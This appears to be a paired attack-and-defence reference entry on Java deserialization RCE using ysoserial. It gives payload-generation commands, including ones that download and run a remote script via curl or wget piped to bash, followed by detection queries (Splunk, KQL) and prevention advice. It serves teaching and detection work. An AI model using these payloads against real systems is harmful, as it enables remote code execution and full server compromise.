name: ysoserial - Java Deserialization RCE Gadget Chains
description: ysoserial generates Java serialized object payloads that abuse gadget chains present in common libraries (Apache Commons Collections, Spring, Groovy, Hibernate) to achieve remote code execution when an application calls ObjectInputStream.readObject() on attacker-controlled data. Java deserialization sinks show up in HTTP parameters, hidden form fields, cookies, RMI/JMX endpoints, and many enterprise message buses.
notes:
=== IDENTIFY A JAVA SERIALIZED SINK ===
  # Raw stream always starts with magic bytes AC ED 00 05.
  # Base64 of that stream starts with rO0AB.
  # Look for these in HTTP params, cookies, hidden fields, ViewState-like blobs, RMI/JMX/T3/JMS traffic.
  echo -n '<blob>' | base64 -d | xxd | head   # confirm AC ED 00 05

=== STEP 1: SAFE CONFIRMATION WITH URLDNS (no RCE, no gadget needed) ===
  # URLDNS only triggers a DNS lookup - works on ANY classpath, proves the sink deserializes.
  java -jar ysoserial.jar URLDNS "http://<ip>.oast.pro/" > urldns.bin
  # Deliver urldns.bin, then watch your DNS/Burp Collaborator/interactsh listener for the callback.

=== STEP 2: RCE ONCE A CHAIN IS CONFIRMED ===
  java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
  java -jar ysoserial.jar CommonsCollections6 "wget http://<ip>/s.sh -O /tmp/s.sh" > payload.bin
  # Base64 for injection into a web parameter:
  java -jar ysoserial.jar CommonsCollections6 "curl http://<ip>/x|bash" | base64 -w0

=== COMMON GADGET CHAINS (pick by library on the classpath) ===
  URLDNS                         # detection only, always works
  CommonsCollections1..7         # commons-collections 3.1 / 4.0
  Spring1, Spring2               # spring-core + spring-beans
  Groovy1                        # groovy
  Hibernate1, JSON1, Jdk7u21     # situational
  # List everything your jar supports:
  java -jar ysoserial.jar

=== DELIVERY VECTORS ===
- HTTP body / parameter / cookie carrying a base64 rO0AB blob
- Java RMI registry (ysoserial.exploit.RMIRegistryExploit)
- JMX / JNDI (pair with a JNDI/LDAP log4shell-style vector)
- Message queues (JMS/ActiveMQ)

=== ALTERNATIVES ===
  marshalsec        # JNDI/RMI/LDAP marshalling gadgets
  GadgetProbe       # remotely fingerprint which library classes exist
  SerialVersionUID scanning in Burp (Java Deserialization Scanner / Freddy)

examples.label: Base64 payload for a web parameter

defense.why_it_works: Calling ObjectInputStream.readObject() on untrusted bytes instantiates arbitrary classes and runs their readObject/finalize logic. Gadget chains stitch together library methods already on the classpath into an RCE primitive, so no attacker code needs to exist on the server beforehand.
defense.prerequisites: An endpoint that deserializes attacker-controlled Java objects, plus a vulnerable gadget library (e.g. commons-collections 3.1) on the application classpath.
defense.impact: Remote code execution as the application service account, leading to full server compromise.
defense.detection: [MITRE T1190] Inbound requests carrying the Java magic bytes (rO0AB base64 / AC ED 00 05 raw); [MITRE T1059] the JVM (java/javaw) spawning shell interpreters (sh, bash, cmd, powershell) or network tools (wget, curl) as child processes.
defense.artifacts: Web/proxy logs containing rO0AB or raw AC ED 00 05 blobs; EDR process-tree showing java -> sh/bash/cmd; outbound DNS to a URLDNS callback host; unexpected RMI/JMX connections.
defense.splunk_spl:
index=web (request_body="*rO0AB*" OR uri_query="*rO0AB*")
| table _time, src_ip, uri_path, request_body
| join type=outer host [ search index=edr parent_process="*java*" (process_name=sh OR process_name=bash OR process_name=cmd.exe) ]
defense.sentinel_kql:
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("java.exe","javaw.exe")
| where FileName in~ ("cmd.exe","powershell.exe","bash","sh")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
defense.prevention: Do not deserialize untrusted data; prefer JSON/XML with explicit schemas. Enforce a strict look-ahead class allowlist (ValidatingObjectInputStream / JEP 290 serialization filters). Remove or upgrade known gadget libraries; run the app with least privilege so RCE is contained.

detections.name: Java process spawning a shell (deserialization RCE)
detections.logic:
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("java.exe","javaw.exe")
| where FileName in~ ("cmd.exe","powershell.exe","bash","sh","wget","curl")
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
detections.false_positives: Build servers or app tooling that legitimately shell out from Java
detections.tuning: Scope to production web/app tiers; allowlist known CI hosts
